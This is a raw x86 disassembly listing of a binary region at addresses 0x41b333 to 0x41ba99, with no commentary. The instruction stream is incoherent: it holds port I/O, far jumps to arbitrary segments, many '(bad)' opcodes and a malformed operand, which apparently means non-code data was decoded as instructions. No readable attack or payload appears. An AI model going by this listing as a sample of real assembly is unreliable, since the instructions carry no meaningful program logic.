  41b333:	pop    es
  41b334:	out    0xf4,al
  41b336:	shl    DWORD PTR [eax+0x49],1
  41b339:	or     eax,0x2b626163
  41b33e:	out    dx,eax
  41b33f:	add    al,0xc6
  41b341:	xlat   BYTE PTR ds:[ebx]
  41b342:	cmp    BYTE PTR [ebx+0x3c],al
  41b345:	jno    0x41b380
  41b347:	arpl   WORD PTR [esi],si
  41b349:	fcom   QWORD PTR ds:0x6d70abe6
  41b34f:	mov    BYTE PTR [edx+0x77],bh
  41b352:	cmp    ch,BYTE PTR [eax+0x24]
  41b355:	inc    ecx
  41b356:	fcom   QWORD PTR [esi]
  41b358:	push   edi
  41b359:	xor    esi,DWORD PTR [ebx+0x4d]
  41b35c:	in     eax,0xa9
  41b35e:	xor    ah,BYTE PTR gs:[edx-0x36360d38]
  41b365:	fldcw  WORD PTR [edx+0x5d1d23c8]
  41b36b:	pop    ecx
  41b36c:	data16 mov ds:0x33d088a1,al
  41b372:	clc    
  41b373:	daa    
  41b374:	add    ah,bh
  41b376:	imul   ebx,DWORD PTR [edi+0x4d],0x68901be1
  41b37d:	ins    BYTE PTR es:[edi],dx
  41b37e:	inc    ebx
  41b37f:	sbb    ebx,edx
  41b381:	push   eax
  41b382:	pop    ds
  41b383:	xor    ah,dh
  41b385:	arpl   WORD PTR [eax],ax
  41b387:	mov    ebp,0xe47b2081
  41b38c:	adc    esp,eax
  41b38e:	cwde   
  41b38f:	not    DWORD PTR [ecx+0x227ebbd2]
  41b395:	ficomp WORD PTR [edi]
  41b397:	jmp    0x41b3b8
  41b399:	in     al,dx
  41b39a:	ds cmp eax,0x3878298d
  41b3a0:	popa   
  41b3a1:	pop    es
  41b3a2:	clc    
  41b3a3:	ins    DWORD PTR es:[edi],dx
  41b3a4:	pop    ebx
  41b3a5:	dec    esp
  41b3a6:	mov    al,0x3f
  41b3a8:	sub    DWORD PTR [edx+eiz*4-0x653387a6],eax
  41b3af:	aaa    
  41b3b0:	cdq    
  41b3b1:	lods   eax,DWORD PTR ds:[esi]
  41b3b2:	sub    al,0x67
  41b3b4:	sbb    eax,DWORD PTR [ecx+0x73e40b54]
  41b3ba:	sbb    eax,0x86a108a6
  41b3bf:	xchg   ebx,eax
  41b3c0:	xor    DWORD PTR [ebx-0x56],eax
  41b3c3:	pop    es
  41b3c4:	sbb    DWORD PTR [ebx+0x6aa6b714],ebx
  41b3ca:	push   ebp
  41b3cb:	idiv   BYTE PTR [ebp+0x2b6d50f7]
  41b3d1:	mov    bl,0xa7
  41b3d3:	inc    edi
  41b3d4:	or     DWORD PTR ds:0x8f37dc69,eax
  41b3da:	imul   ebp,DWORD PTR [esi+eax*8-0x655c49e6],0x2962cd05
  41b3e5:	mov    ds:0x966efe62,al
  41b3ea:	cs fstp st(6)
  41b3ed:	pop    esi
  41b3ee:	cld    
  41b3ef:	hlt    
  41b3f0:	mov    bh,0x28
  41b3f2:	leave  
  41b3f3:	mov    DWORD PTR [eax+ebp*1-0x4c],esi
  41b3f7:	popf   
  41b3f8:	outs   dx,DWORD PTR ds:[esi]
  41b3f9:	cmp    bh,al
  41b3fb:	mov    esp,0x93eac494
  41b400:	pop    ss
  41b401:	gs jb  0x41b475
  41b404:	jno    0x41b410
  41b406:	xor    eax,0xbea94d6c
  41b40b:	cmc    
  41b40c:	(bad)  
  41b40d:	(bad)  
  41b40e:	retf   0x7675
  41b411:	lea    ecx,[eax-0x3f]
  41b414:	nop
  41b415:	clc    
  41b416:	jbe    0x41b410
  41b418:	hlt    
  41b419:	mov    edx,0x6d7f2d26
  41b41e:	push   0xfffffffc
  41b420:	xor    eax,0x5ac3c45c
  41b425:	js     0x41b416
  41b427:	loopne 0x41b478
  41b429:	test   DWORD PTR [esi+0x1],esi
  41b42c:	pushf  
  41b42d:	xor    esi,edx
  41b42f:	pop    esi
  41b430:	in     al,0xe3
  41b432:	sbb    DWORD PTR [esi],edx
  41b434:	push   0xffffffa2
  41b436:	js     0x41b47f
  41b438:	push   ebp
  41b439:	lods   al,BYTE PTR ds:[esi]
  41b43a:	or     bl,BYTE PTR [esi+0x78e97713]
  41b440:	xchg   ebx,eax
  41b441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b442:	adc    dh,BYTE PTR [esi-0x56e25242]
  41b448:	out    0xf3,eax
  41b44a:	sti    
  41b44b:	inc    edi
  41b44c:	dec    edx
  41b44d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b44e:	pop    edx
  41b44f:	add    al,0x49
  41b451:	pop    es
  41b452:	dec    eax
  41b453:	je     0x41b490
  41b455:	xchg   edi,eax
  41b456:	and    eax,0xde0d97b5
  41b45b:	sbb    ebx,DWORD PTR [ebx-0x522609e8]
  41b461:	(bad)  
  41b462:	fs and eax,ecx
  41b465:	mov    ecx,0xb5b693c4
  41b46a:	sub    eax,0x847a12ca
  41b46f:	add    dl,al
  41b471:	adc    eax,0x5fc424d9
  41b476:	or     al,0x79
  41b478:	int3   
  41b479:	repz scas al,BYTE PTR es:[edi]
  41b47b:	mov    fs,WORD PTR [edi+0x4a90f5ea]
  41b481:	mov    eax,ebx
  41b483:	or     BYTE PTR [edx],bl
  41b485:	mov    ebp,0x33aebdfc
  41b48a:	dec    eax
  41b48b:	sub    DWORD PTR [esi+0x792f4daf],edi
  41b491:	leavew 
  41b493:	fisubr WORD PTR [eax+0x3e964a72]
  41b499:	pop    edx
  41b49a:	(bad)  
  41b49b:	sbb    cl,ah
  41b49d:	gs cld 
  41b49f:	arpl   bp,sp
  41b4a1:	and    ebp,DWORD PTR [ecx]
  41b4a3:	fcomp  DWORD PTR [edx-0x4a]
  41b4a6:	mov    eax,ds:0xdfe30a3f
  41b4ab:	mov    ebx,0xa24f1486
  41b4b0:	or     ebx,DWORD PTR [ebx]
  41b4b2:	stc    
  41b4b3:	and    esi,esi
  41b4b5:	add    BYTE PTR [ecx+eax*2],bh
  41b4b8:	pop    eax
  41b4b9:	xchg   edi,eax
  41b4ba:	frstor [ecx-0x6c]
  41b4bd:	dec    ecx
  41b4be:	mov    dh,dl
  41b4c0:	mov    BYTE PTR [eax],al
  41b4c2:	cmp    edx,esi
  41b4c4:	pop    ecx
  41b4c5:	adc    eax,0x19642c13
  41b4ca:	cmp    al,0x96
  41b4cc:	mov    esp,0xdcf2a11
  41b4d1:	add    ecx,DWORD PTR [ebp+0x24]
  41b4d4:	mov    ds:0xc6bab570,eax
  41b4d9:	cmp    DWORD PTR [ebx],esp
  41b4db:	idiv   DWORD PTR [esp+ebp*8+0xb]
  41b4df:	or     DWORD PTR [ebx+0x3aff2a0c],ebx
  41b4e5:	daa    
  41b4e6:	es push 0x76afd3e
  41b4ec:	fsubr  QWORD PTR [ecx-0x1f372371]
  41b4f2:	xchg   ecx,eax
  41b4f3:	cwde   
  41b4f4:	div    DWORD PTR [esi+eiz*4+0x77]
  41b4f8:	cwde   
  41b4f9:	gs rcr al,0x4f
  41b4fd:	rol    BYTE PTR [ebx-0x31820ee3],1
  41b503:	sub    ebp,DWORD PTR [ebx]
  41b505:	shl    BYTE PTR [ebp-0x11],0x97
  41b509:	stos   BYTE PTR es:[edi],al
  41b50a:	into   
  41b50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50c:	xchg   esi,eax
  41b50d:	call   0x308d0816
  41b512:	icebp  
  41b513:	adc    eax,0xe06f4c3d
  41b518:	les    eax,FWORD PTR [esi+0x24d891e1]
  41b51e:	cmc    
  41b51f:	xor    DWORD PTR [edx+0x1],edx
  41b522:	mov    esp,0x8ba7ad56
  41b527:	mov    cl,0xa4
  41b529:	(bad)  
  41b52a:	out    0x2b,al
  41b52c:	scas   al,BYTE PTR es:[edi]
  41b52d:	add    DWORD PTR [eax+0x758f81c],ebx
  41b533:	xchg   DWORD PTR [esp-0x4c],esi
  41b537:	lahf   
  41b538:	mov    cl,0x36
  41b53a:	ss jo  0x41b51e
  41b53d:	mov    dh,0x2f
  41b53f:	jle    0x41b55e
  41b541:	push   esi
  41b542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b543:	dec    eax
  41b544:	iret   
  41b545:	hlt    
  41b546:	push   cs
  41b547:	add    eax,0x5b274999
  41b54c:	mov    WORD PTR [di-0x42],0xef8a
  41b553:	pop    edx
  41b554:	dec    eax
  41b555:	pop    ss
  41b556:	lods   eax,DWORD PTR ds:[esi]
  41b557:	out    0x8f,al
  41b559:	(bad)  
  41b55a:	cs dec eax
  41b55c:	add    eax,0x1df6e9ba
  41b561:	fcomp  QWORD PTR [ebx]
  41b563:	cli    
  41b564:	inc    ebp
  41b565:	and    BYTE PTR [edx+0xecc8b9e],ah
  41b56b:	mov    eax,0xe9e8f679
  41b570:	rcr    BYTE PTR [edi+0x2c8999f3],cl
  41b576:	popa   
  41b577:	pusha  
  41b578:	rol    DWORD PTR [ecx],0x75
  41b57b:	stc    
  41b57c:	or     eax,0x68ca2038
  41b581:	cli    
  41b582:	mov    dl,0x27
  41b584:	iret   
  41b585:	mov    ebp,0xf9a0077f
  41b58a:	mov    esi,0x1a0a6121
  41b58f:	push   edi
  41b590:	cdq    
  41b591:	mov    eax,ds:0xde148bb9
  41b596:	test   BYTE PTR [eax+0x6b],bh
  41b599:	mov    edi,0x8c37ae05
  41b59e:	retf   
  41b59f:	ficomp WORD PTR [edi]
  41b5a1:	scas   al,BYTE PTR es:[edi]
  41b5a2:	mov    edi,0x316f6f10
  41b5a7:	js     0x41b596
  41b5a9:	cdq    
  41b5aa:	pop    esp
  41b5ab:	inc    ebp
  41b5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ad:	pop    ebx
  41b5ae:	pop    es
  41b5af:	add    edx,0x66
  41b5b2:	dec    edi
  41b5b3:	adc    al,0xa0
  41b5b5:	push   edx
  41b5b6:	cmc    
  41b5b7:	mov    bh,0xc4
  41b5b9:	loope  0x41b606
  41b5bb:	lods   al,BYTE PTR ds:[esi]
  41b5bc:	imul   eax,DWORD PTR [esi-0x27485b14],0xda828b8b
  41b5c6:	pop    ebp
  41b5c7:	push   ebx
  41b5c8:	push   esi
  41b5c9:	lahf   
  41b5ca:	lahf   
  41b5cb:	icebp  
  41b5cc:	and    eax,0xcb144d03
  41b5d1:	adc    DWORD PTR [ecx+ebx*2],ebx
  41b5d4:	rcr    BYTE PTR [esi],cl
  41b5d6:	adc    al,0x6d
  41b5d8:	and    DWORD PTR [esp+edi*8-0x11b616c8],edi
  41b5df:	mov    edi,0x44e6f666
  41b5e4:	mov    bh,0x26
  41b5e6:	inc    esp
  41b5e7:	pusha  
  41b5e8:	adc    dh,dh
  41b5ea:	sbb    edi,edi
  41b5ec:	sbb    al,ah
  41b5ee:	fmulp  st(1),st
  41b5f0:	test   DWORD PTR [esp+ebp*1],edx
  41b5f3:	fsubr  QWORD PTR [edi+ebx*4]
  41b5f6:	mov    ?,eax
  41b5f8:	lods   eax,DWORD PTR ds:[esi]
  41b5f9:	ins    BYTE PTR es:[edi],dx
  41b5fa:	cmp    eax,0x78f157a8
  41b5ff:	shl    DWORD PTR ds:0xcf935e9b,cl
  41b605:	fidivr WORD PTR [edx-0x7f]
  41b608:	icebp  
  41b609:	inc    esi
  41b60a:	add    eax,0x74336a4d
  41b60f:	dec    esi
  41b610:	jb     0x41b663
  41b612:	jmp    0x41b5ea
  41b614:	(bad)  
  41b615:	das    
  41b616:	test   edx,0x5692a15c
  41b61c:	pop    ecx
  41b61d:	test   BYTE PTR [edx-0x78d537d4],ah
  41b623:	es mov ah,0xfe
  41b626:	pop    eax
  41b627:	int    0x1
  41b629:	int    0x87
  41b62b:	dec    ecx
  41b62c:	mov    cl,0xde
  41b62e:	and    ebp,DWORD PTR [eax-0x1]
  41b631:	mul    DWORD PTR [ebx]
  41b633:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b635:	mov    ecx,0x7b2214a4
  41b63a:	inc    esi
  41b63b:	or     bh,BYTE PTR [ecx+0x17]
  41b63e:	mov    dl,0xd4
  41b640:	pushf  
  41b641:	or     BYTE PTR [ebx-0x6e],0x38
  41b645:	retf   0xcf4f
  41b648:	add    ch,BYTE PTR [ecx]
  41b64a:	ins    DWORD PTR es:[edi],dx
  41b64b:	sub    eax,0xe08e1680
  41b650:	dec    esi
  41b651:	push   edx
  41b652:	int    0x4e
  41b654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b655:	lahf   
  41b656:	sub    DWORD PTR [edi+esi*2-0x3c3d85f9],eax
  41b65d:	call   0xf1d8:0xc1089c61
  41b664:	sbb    DWORD PTR [ecx+0x281d7077],edi
  41b66a:	fwait
  41b66b:	jl     0x41b6ab
  41b66d:	jp     0x41b634
  41b66f:	push   ecx
  41b670:	data16 ficom DWORD PTR [edi+esi*2]
  41b674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b675:	in     al,0x94
  41b677:	int3   
  41b678:	cs inc eax
  41b67a:	or     ecx,edx
  41b67c:	push   0x28
  41b67e:	add    DWORD PTR [esi+0x4ba82745],ebp
  41b684:	jmp    0xbe0a:0xd8dcebe0
  41b68b:	dec    esp
  41b68c:	dec    ecx
  41b68d:	jge    0x41b6f3
  41b68f:	in     al,0xa
  41b691:	ss jl  0x41b6d8
  41b694:	sub    bl,BYTE PTR [edx+0x3a]
  41b697:	xchg   edx,eax
  41b698:	dec    esi
  41b699:	ret    0xd6d5
  41b69c:	mov    edi,0xd4396698
  41b6a1:	dec    esi
  41b6a2:	stos   BYTE PTR es:[edi],al
  41b6a3:	xchg   esp,eax
  41b6a4:	mov    DWORD PTR [ebx-0x25bb6e1f],esp
  41b6aa:	aam    0xa1
  41b6ac:	or     DWORD PTR [esi-0x70],ebp
  41b6af:	push   0xfb366192
  41b6b4:	push   0x385d4a6
  41b6b9:	dec    eax
  41b6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6bb:	adc    bl,BYTE PTR ds:0x864a6c4
  41b6c2:	mov    dl,0x93
  41b6c4:	push   ds
  41b6c5:	jmp    0x4fef:0xa613162d
  41b6cc:	push   ss
  41b6cd:	frstor [edx-0x3bd13d9f]
  41b6d3:	xchg   ecx,eax
  41b6d4:	ror    DWORD PTR [edx-0x62],1
  41b6d7:	jae    0x41b68b
  41b6d9:	loope  0x41b733
  41b6db:	dec    ebp
  41b6dc:	push   esp
  41b6dd:	out    0xc1,al
  41b6df:	fstp   QWORD PTR [ebp-0x30]
  41b6e2:	mov    esi,edi
  41b6e4:	sub    DWORD PTR [esi],ebp
  41b6e6:	sub    ch,BYTE PTR [edi]
  41b6e8:	jp     0x41b6fa
  41b6ea:	shl    DWORD PTR [ebp+0x4e],0x4c
  41b6ee:	test   eax,edi
  41b6f0:	daa    
  41b6f1:	into   
  41b6f2:	arpl   dx,cx
  41b6f4:	fnsave [edi+edi*2+0x1d]
  41b6f8:	out    dx,eax
  41b6f9:	jns    0x41b6c4
  41b6fb:	fidivr WORD PTR [ecx]
  41b6fd:	mov    ebp,0xea7835d9
  41b702:	into   
  41b703:	pop    esp
  41b704:	dec    ebp
  41b705:	adc    edi,DWORD PTR [esi+0x2c]
  41b708:	aam    0xa5
  41b70a:	mov    ds:0x797966f0,al
  41b70f:	scas   ax,WORD PTR es:[edi]
  41b711:	sbb    al,0xf2
  41b713:	js     0x41b737
  41b715:	repz test al,0xe3
  41b718:	stos   BYTE PTR es:[edi],al
  41b719:	es (bad) 
  41b71b:	jmp    0x6efb:0x937b4a73
  41b722:	outs   dx,BYTE PTR ds:[esi]
  41b723:	xchg   esi,eax
  41b724:	sub    al,ch
  41b726:	push   edx
  41b727:	cmp    dl,dl
  41b729:	mov    ebp,0x159c6bdd
  41b72e:	call   0x31f2193d
  41b733:	mov    al,ds:0xe8b2f362
  41b738:	push   cs
  41b739:	cwde   
  41b73a:	ins    BYTE PTR es:[edi],dx
  41b73b:	sub    BYTE PTR [esi-0x37],bh
  41b73e:	sub    al,0xa7
  41b740:	sti    
  41b741:	rol    DWORD PTR [esi-0x68051cfb],0xf
  41b748:	cwde   
  41b749:	js     0x41b766
  41b74b:	repz ficomp WORD PTR [esp+esi*8-0x24ef52e0]
  41b753:	cmp    eax,0xa3ff9886
  41b758:	test   al,0x47
  41b75a:	xchg   ecx,eax
  41b75b:	mov    bl,0x7
  41b75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b75e:	nop
  41b75f:	sbb    ebx,DWORD PTR [ecx-0x5f]
  41b762:	nop
  41b763:	clc    
  41b764:	mov    al,0xc6
  41b766:	or     DWORD PTR [eax-0x633e9adf],0xffffffcf
  41b76d:	jg     0x41b6f4
  41b76f:	inc    esi
  41b770:	cmc    
  41b771:	clc    
  41b772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b773:	or     bl,0xa7
  41b776:	lea    eax,ds:0x4133729b
  41b77c:	cmp    ch,BYTE PTR [eax]
  41b77e:	push   cs
  41b77f:	push   ebp
  41b780:	repnz out dx,al
  41b782:	fdiv   QWORD PTR [esi+ebp*8+0x195e8f3c]
  41b789:	xchg   ecx,eax
  41b78a:	ret    
  41b78b:	out    dx,eax
  41b78c:	addr16 jmp 0xb6ef:0xd0d516b2
  41b794:	push   0x2c06f3ce
  41b799:	pop    ebp
  41b79a:	add    eax,0x5d5c50eb
  41b79f:	scas   al,BYTE PTR es:[edi]
  41b7a0:	mov    al,0x8
  41b7a2:	fnsave [edi]
  41b7a4:	inc    ebp
  41b7a5:	out    dx,eax
  41b7a6:	push   edx
  41b7a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7a8:	stos   DWORD PTR es:[edi],eax
  41b7a9:	ja     0x41b762
  41b7ab:	jmp    0x41b72e
  41b7ad:	xchg   ebx,eax
  41b7ae:	ret    0x5355
  41b7b1:	xchg   edi,eax
  41b7b2:	inc    edx
  41b7b3:	lea    ecx,[eax+0x5e]
  41b7b6:	xor    al,0x46
  41b7b8:	scas   eax,DWORD PTR es:[edi]
  41b7b9:	popf   
  41b7ba:	iret   
  41b7bb:	pop    ds
  41b7bc:	pop    edi
  41b7bd:	fadd   DWORD PTR cs:[ebx+0x7c]
  41b7c1:	stc    
  41b7c2:	cdq    
  41b7c3:	clc    
  41b7c4:	(bad)  
  41b7c5:	jg     0x41b825
  41b7c7:	xor    eax,0x3624fe17
  41b7cc:	push   ebx
  41b7cd:	je     0x41b788
  41b7cf:	sar    DWORD PTR [esi],0xe0
  41b7d2:	pop    eax
  41b7d3:	sub    DWORD PTR [ebx-0x3],ebp
  41b7d6:	enter  0xe21d,0x14
  41b7da:	xchg   esp,eax
  41b7db:	dec    esi
  41b7dc:	mov    ebx,0x6f9fc6e
  41b7e1:	adc    al,0xcc
  41b7e3:	jnp    0x41b7bd
  41b7e5:	pushf  
  41b7e6:	test   BYTE PTR [ebp-0x42],bl
  41b7e9:	lods   al,BYTE PTR ds:[esi]
  41b7ea:	push   edi
  41b7eb:	mov    ecx,0x5dde740b
  41b7f0:	push   ss
  41b7f1:	ss test eax,0xf2f00aa9
  41b7f7:	jmp    0x24f3:0xe922e56
  41b7fe:	stos   DWORD PTR es:[edi],eax
  41b7ff:	call   0x2d8a773e
  41b804:	jg     0x41b808
  41b806:	cmp    ecx,DWORD PTR [eax+0x1ffe670c]
  41b80c:	retf   
  41b80d:	rcr    BYTE PTR [eax-0x63],0xb6
  41b811:	stos   DWORD PTR es:[edi],eax
  41b812:	ret    
  41b813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b814:	stos   BYTE PTR es:[edi],al
  41b815:	loope  0x41b86d
  41b817:	popa   
  41b818:	mov    esp,ds
  41b81a:	mov    bh,0x83
  41b81c:	mov    bh,0xa5
  41b81e:	sbb    edx,DWORD PTR [edx+0x2c971b00]
  41b824:	sub    ah,ch
  41b826:	pop    esp
  41b827:	sub    BYTE PTR [edi],0xe7
  41b82a:	call   0x68bc:0x57b1b52c
  41b831:	ins    DWORD PTR es:[edi],dx
  41b832:	push   0x58
  41b834:	inc    ebx
  41b835:	inc    esp
  41b836:	stos   BYTE PTR es:[edi],al
  41b837:	enter  0x8dbc,0x18
  41b83b:	cmp    DWORD PTR [edi+0x27dc9ce2],esp
  41b841:	jge    0x41b84b
  41b843:	fiadd  WORD PTR [ebx]
  41b845:	pusha  
  41b846:	es aas 
  41b848:	sub    esp,DWORD PTR [edx+ecx*8-0x48]
  41b84c:	adc    BYTE PTR [eax],dh
  41b84e:	lds    edi,FWORD PTR [ebp+0xae63b43]
  41b854:	iret   
  41b855:	mov    ds:0x3eea5cb2,al
  41b85a:	in     al,dx
  41b85b:	sbb    eax,0xe282464
  41b860:	jl     0x41b8a0
  41b862:	popa   
  41b863:	mov    eax,ds:0x380891a7
  41b868:	pop    edx
  41b869:	shl    BYTE PTR [ecx+0x6352627e],0x88
  41b870:	sbb    al,0x4a
  41b872:	xor    edx,DWORD PTR [esi-0x63]
  41b875:	sbb    al,BYTE PTR [edi]
  41b877:	in     al,0x71
  41b879:	add    DWORD PTR [edi-0x2ccf1dba],esi
  41b87f:	out    0xd1,eax
  41b881:	lods   al,BYTE PTR ds:[esi]
  41b882:	lds    edx,FWORD PTR [ebx-0x7a]
  41b885:	out    dx,al
  41b886:	adc    al,0x47
  41b888:	js     0x41b830
  41b88a:	ror    BYTE PTR [ecx+0x2ab0ee46],cl
  41b890:	cs mov bh,0x35
  41b893:	(bad)  
  41b894:	mov    edi,0xc7a05f3f
  41b899:	ret    
  41b89a:	std    
  41b89b:	bound  dx,DWORD PTR [ecx+0x39]
  41b89f:	jle    0x41b866
  41b8a1:	div    al
  41b8a3:	cmp    bh,BYTE PTR [edx+0x287bd85]
  41b8a9:	sti    
  41b8aa:	pop    esi
  41b8ab:	xor    bl,al
  41b8ad:	and    eax,0x8345c9b1
  41b8b2:	cmc    
  41b8b3:	jmp    0x4767:0xfc65ecf5
  41b8ba:	daa    
  41b8bb:	jmp    0xa3bf:0x27d542a1
  41b8c2:	jne    0x41b923
  41b8c4:	ins    BYTE PTR es:[edi],dx
  41b8c5:	adc    esi,eax
  41b8c7:	sub    al,0xe1
  41b8c9:	xchg   edi,eax
  41b8ca:	sahf   
  41b8cb:	aaa    
  41b8cc:	aaa    
  41b8cd:	gs jno 0x41b8bb
  41b8d0:	jle    0x41b877
  41b8d2:	mov    esi,0x9d3c903b
  41b8d7:	(bad)  
  41b8d8:	fld    DWORD PTR [ecx-0x2]
  41b8db:	and    edx,edx
  41b8dd:	cs jns 0x41b8c4
  41b8e0:	sahf   
  41b8e1:	jl     0x41b8d4
  41b8e3:	xor    al,0x5f
  41b8e5:	int    0x66
  41b8e7:	pop    ds
  41b8e8:	rcl    BYTE PTR [eax+0x10cd1f2],cl
  41b8ee:	pop    ss
  41b8ef:	int    0x90
  41b8f1:	out    dx,al
  41b8f2:	add    eax,0x20c911b2
  41b8f7:	push   edx
  41b8f8:	sbb    bl,ah
  41b8fa:	stc    
  41b8fb:	and    edx,DWORD PTR [eax+0x57]
  41b8fe:	cli    
  41b8ff:	je     0x41b8ba
  41b901:	ins    DWORD PTR es:[edi],dx
  41b902:	adc    eax,0xef47fb52
  41b907:	fs adc bl,bl
  41b90a:	stos   BYTE PTR es:[edi],al
  41b90b:	xchg   edi,eax
  41b90c:	mov    bh,0xe3
  41b90e:	sbb    cl,BYTE PTR [eax-0x43b283b4]
  41b914:	inc    eax
  41b915:	in     al,dx
  41b916:	ss mov ebp,ebp
  41b919:	inc    ebp
  41b91a:	xchg   ecx,eax
  41b91b:	cdq    
  41b91c:	scas   al,BYTE PTR es:[edi]
  41b91d:	mov    bh,0xc7
  41b91f:	xchg   esi,eax
  41b920:	or     al,dh
  41b922:	cwde   
  41b923:	xor    eax,0x52df191a
  41b928:	jle    0x41b8bb
  41b92a:	fst    DWORD PTR [ebp-0x2f6595ed]
  41b930:	dec    esp
  41b932:	mov    esi,0x4ab78af8
  41b937:	push   ss
  41b938:	test   eax,0x6954e59e
  41b93d:	jae    0x41b917
  41b93f:	ret    
  41b940:	dec    esi
  41b941:	aaa    
  41b942:	xchg   ebx,eax
  41b943:	sub    al,0xa5
  41b945:	neg    BYTE PTR ds:0x94d46449
  41b94b:	sub    al,0xb8
  41b94d:	dec    ecx
  41b94e:	std    
  41b94f:	daa    
  41b950:	xor    DWORD PTR [esp+eax*2-0x4981c768],edx
  41b957:	shl    ah,cl
  41b959:	mov    ecx,0xf446478e
  41b95e:	mov    bl,0xd8
  41b960:	push   ss
  41b961:	cli    
  41b962:	jmp    0x41b9a0
  41b964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b965:	fdiv   st,st(4)
  41b967:	mov    ds:0x7b876116,al
  41b96c:	int    0xf
  41b96e:	and    DWORD PTR [ecx-0x34374b8f],0xffffff8a
  41b975:	cdq    
  41b976:	sub    dl,ch
  41b978:	jp     0x41b90e
  41b97a:	adc    al,0xb2
  41b97c:	mov    al,0x2a
  41b97e:	xor    DWORD PTR [esi-0x50],0xffffffa6
  41b982:	lock sbb eax,DWORD PTR [ecx-0x24b6c411]
  41b989:	out    dx,al
  41b98a:	stos   DWORD PTR es:[edi],eax
  41b98b:	or     BYTE PTR [edx],0x27
  41b98e:	mov    al,0x80
  41b990:	xchg   ebp,eax
  41b991:	dec    edx
  41b992:	arpl   WORD PTR [ebp-0x4148927b],di
  41b998:	(bad)  
  41b999:	sub    bh,BYTE PTR [ebp+0x2f]
  41b99c:	pop    ebp
  41b99d:	cdq    
  41b99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b99f:	cwde   
  41b9a0:	inc    ebp
  41b9a1:	(bad)
  41b9a4:	in     al,dx
  41b9a5:	sub    al,0xdc
  41b9a7:	mov    edi,0x1fe79c23
  41b9ac:	js     0x41b9e8
  41b9ae:	jb     0x41b9f4
  41b9b0:	sub    ch,BYTE PTR [ebx]
  41b9b2:	dec    edx
  41b9b3:	test   DWORD PTR [ebx-0xf],esi
  41b9b6:	jbe    0x41b9f4
  41b9b8:	lahf   
  41b9b9:	mov    edi,DWORD PTR [ebx-0x1f9346ed]
  41b9bf:	retf   0xc860
  41b9c2:	imul   edi,DWORD PTR [edi],0x1678bd47
  41b9c8:	rcl    BYTE PTR [esi-0x5800b50c],0x97
  41b9cf:	pop    ds
  41b9d0:	pusha  
  41b9d1:	mov    WORD PTR [esi-0x4ce07f84],es
  41b9d7:	add    BYTE PTR [eax-0x7e],0xca
  41b9db:	stos   DWORD PTR es:[edi],eax
  41b9dc:	cmp    eax,0xa36858
  41b9e1:	lods   eax,DWORD PTR ds:[esi]
  41b9e2:	nop
  41b9e3:	xchg   esi,eax
  41b9e4:	jl     0x41b9f1
  41b9e6:	stc    
  41b9e7:	mov    dh,0xa8
  41b9e9:	loope  0x41b9c8
  41b9eb:	mov    ds:0xc0140ffa,al
  41b9f0:	or     edi,DWORD PTR [edi+ebp*4-0x5f]
  41b9f4:	in     eax,0x39
  41b9f6:	(bad)  
  41b9f7:	hlt    
  41b9f8:	dec    edx
  41b9f9:	pop    esp
  41b9fa:	test   ebx,ebp
  41b9fc:	dec    esi
  41b9fd:	add    ecx,DWORD PTR [edi-0x5]
  41ba00:	int    0x5a
  41ba02:	push   esi
  41ba03:	jmp    0x5255:0x69613576
  41ba0a:	mov    DWORD PTR [esi+0x3618eb5a],0xcbfd00f
  41ba14:	lahf   
  41ba15:	mov    ch,ch
  41ba17:	jno    0x41ba93
  41ba19:	lods   eax,DWORD PTR ds:[esi]
  41ba1a:	xor    bl,BYTE PTR [ecx+0x22]
  41ba1d:	jae    0x8115e29e
  41ba23:	mov    bl,0xca
  41ba25:	cmp    bh,ah
  41ba27:	push   cs
  41ba28:	std    
  41ba29:	popa   
  41ba2a:	outs   dx,BYTE PTR ds:[esi]
  41ba2b:	dec    edi
  41ba2c:	jle    0x41ba3f
  41ba2e:	mov    ebp,0x385a8435
  41ba33:	mov    eax,0x76a5fb2b
  41ba38:	in     eax,0x41
  41ba3a:	dec    esi
  41ba3b:	mov    dh,0x98
  41ba3d:	das    
  41ba3e:	dec    esp
  41ba3f:	or     al,0xf9
  41ba41:	ja     0x41ba6d
  41ba43:	fs (bad) 
  41ba45:	and    DWORD PTR [esi+0x6ec0380d],eax
  41ba4b:	fst    DWORD PTR [edx+0x46]
  41ba4e:	pusha  
  41ba4f:	test   BYTE PTR [esi],ch
  41ba51:	lods   al,BYTE PTR fs:[esi]
  41ba53:	mov    WORD PTR [eax-0xd11eb7e],fs
  41ba59:	shl    ebp,0xb2
  41ba5c:	lea    ecx,[ebp+0x7b3dfdb2]
  41ba62:	inc    ebx
  41ba63:	jg     0x41ba06
  41ba65:	mov    ch,0x7a
  41ba67:	inc    DWORD PTR [edi-0xb8c383a]
  41ba6d:	jnp    0x41bad1
  41ba6f:	dec    ecx
  41ba70:	ins    DWORD PTR es:[edi],dx
  41ba71:	or     BYTE PTR [ebx*2-0x20ba5b1e],cl
  41ba78:	test   DWORD PTR [esi-0xc059278],eax
  41ba7e:	lods   eax,DWORD PTR ds:[esi]
  41ba7f:	push   esp
  41ba80:	daa    
  41ba81:	outs   dx,DWORD PTR ds:[esi]
  41ba82:	xlat   BYTE PTR ds:[ebx]
  41ba83:	scas   al,BYTE PTR es:[edi]
  41ba84:	sbb    al,0xd7
  41ba86:	out    0xdb,al
  41ba88:	mov    bh,0x6a
  41ba8a:	stos   DWORD PTR es:[edi],eax
  41ba8b:	sub    ch,dh
  41ba8d:	jnp    0x41bace
  41ba8f:	adc    eax,esi
  41ba91:	aad    0xda
  41ba93:	leave  
  41ba94:	or     DWORD PTR [edi-0x72],esi
  41ba97:	jbe    0x41bafd
  41ba99:	call   0x1937:0x61672ce4
